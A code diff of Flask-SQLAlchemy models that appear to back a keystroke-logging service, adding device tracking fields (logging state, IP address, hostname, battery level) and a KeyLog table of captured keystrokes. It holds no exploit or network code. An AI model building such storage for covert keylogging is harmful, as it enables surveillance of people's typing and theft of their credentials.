@@ -1,7 +1,8 @@
 from datetime import datetime
-from flask_sqlalchemy import SQLAlchemy
+import uuid
 from flask_login import UserMixin
 from werkzeug.security import generate_password_hash, check_password_hash
+from flask_sqlalchemy import SQLAlchemy
 
 db = SQLAlchemy()
 
@@ -13,6 +14,8 @@ class User(UserMixin, db.Model):
     password_hash = db.Column(db.String(128))
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     is_active = db.Column(db.Boolean, default=True)
+    
+    devices = db.relationship('Device', backref='user', lazy=True)
 
     def set_password(self, password):
         self.password_hash = generate_password_hash(password)
@@ -23,17 +26,36 @@ class User(UserMixin, db.Model):
 class Device(db.Model):
     __tablename__ = 'device'
     id = db.Column(db.Integer, primary_key=True)
-    device_id = db.Column(db.String(100), unique=True, nullable=False)
+    device_id = db.Column(db.String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
     name = db.Column(db.String(100))
-    is_active = db.Column(db.Boolean, default=True)
-    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
-    user = db.relationship('User', backref=db.backref('devices', lazy=True))
+    is_active = db.Column(db.Boolean, default=False)
+    is_logging = db.Column(db.Boolean, default=False)
+    is_encrypted = db.Column(db.Boolean, default=False)
+    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
+    os_info = db.Column(db.String(100))
+    hostname = db.Column(db.String(100))
+    battery_level = db.Column(db.Float)
+    ip_address = db.Column(db.String(45))
     
-    os_info = db.Column(db.String(100), nullable=True)
-    hostname = db.Column(db.String(100), nullable=True)
-    battery_level = db.Column(db.Integer, nullable=True)
-    ip_address = db.Column(db.String(45), nullable=True)
+    key_logs = db.relationship('KeyLog', 
+                             backref='device', 
+                             lazy=True,
+                             cascade='all, delete-orphan')
+
+    def to_dict(self):
+        return {
+            'id': self.device_id,
+            'name': self.name,
+            'is_active': self.is_active,
+            'is_logging': self.is_logging,
+            'is_encrypted': self.is_encrypted,
+            'last_seen': self.last_seen.isoformat() if self.last_seen else None,
+            'os_info': self.os_info,
+            'hostname': self.hostname,
+            'battery_level': self.battery_level,
+            'ip_address': self.ip_address
+        }
 
 class Keystrokes(db.Model):
     __tablename__ = 'keystrokes'
@@ -74,3 +96,17 @@ class Newsletter(db.Model):
     email = db.Column(db.String(120), unique=True, nullable=False)
     subscribed_at = db.Column(db.DateTime, default=datetime.utcnow)
     is_active = db.Column(db.Boolean, default=True)
+
+class KeyLog(db.Model):
+    __tablename__ = 'key_log'
+    id = db.Column(db.Integer, primary_key=True)
+    device_id = db.Column(db.String(36), db.ForeignKey('device.device_id', ondelete='CASCADE'), nullable=False)
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    keystrokes = db.Column(db.Text, nullable=False)
+
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'timestamp': self.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
+            'keystrokes': self.keystrokes
+        }
